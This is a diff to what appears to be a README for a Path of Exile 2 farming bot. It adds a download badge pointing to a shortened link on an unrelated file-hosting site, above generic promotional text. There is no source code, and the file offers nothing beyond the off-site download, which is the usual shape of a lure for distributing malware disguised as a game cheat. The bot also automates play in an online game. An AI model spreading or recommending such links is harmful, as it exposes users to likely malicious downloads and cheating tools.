@@ -1,4 +1,4 @@
-
+[![Download PoE2 FarmingBot](https://img.shields.io/badge/Download-PoE2%20FarmingBot-blueviolet)](https://downeefiles.com/s/pexlefrmbot)
 
 
 **PoE 2 Farming Bot** is an advanced automation tool designed to enhance your Path of Exile 2 experience by automating resource gathering and farming. This bot helps players efficiently collect items, currency, and materials, saving time and effort while maximizing rewards. Whether you're farming for valuable loot, crafting materials, or in-game currency, PoE 2 Farming Bot streamlines the process and allows you to focus on other aspects of the game. The bot is easy to set up and regularly updated to ensure compatibility with the latest game patches and features.
